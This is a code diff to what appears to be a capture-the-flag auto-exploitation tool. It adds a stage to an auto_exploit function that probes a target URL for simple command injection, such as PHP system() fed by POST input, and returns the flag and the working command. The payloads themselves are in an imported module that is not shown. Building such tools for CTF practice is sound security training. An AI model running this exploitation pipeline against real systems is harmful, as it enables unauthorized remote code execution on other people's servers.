@@ -1646,6 +1646,32 @@ def auto_exploit(url, results, on_progress=None, on_found=None, fingerprint=None
         lfi_result['stages'] = ['php_file_inclusion']
         return lfi_result
 
+    # ── v4.0: 简单命令注入直接探测 (无WAF场景, 秒杀 system($_POST[x])) ──
+    _emit('plan', '简单RCE检测', '直接命令注入探测...')
+    try:
+        from yang_web.core.simple_cmd_rce import simple_cmd_rce as _scmdrce
+        _scmdrce_result = _scmdrce(url, on_progress=lambda s, i, t: _emit(s, i, t))
+        if _scmdrce_result and _scmdrce_result.get('flag'):
+            if on_found:
+                try:
+                    on_found(_scmdrce_result['flag'])
+                except Exception:
+                    pass
+            return {
+                'flag': _scmdrce_result['flag'],
+                'vuln_confirmed': [{
+                    'type': 'SIMPLE_CMD_RCE',
+                    'param': _scmdrce_result.get('param'),
+                    'method': _scmdrce_result.get('method'),
+                    'cmd': _scmdrce_result.get('cmd'),
+                }],
+                'attacks_run': 0,
+                'stages': ['simple_cmd_rce'],
+                'timing_ms': int((time.time() - t_start) * 1000),
+            }
+    except Exception:
+        pass
+
     # ── v3.7: bashFuck 无字母命令执行自动检测与利用 ──
     _emit('plan', 'bashFuck检测', '检查 system/exec + WAF...')
     bf_result = _try_bashfuck_exploit(
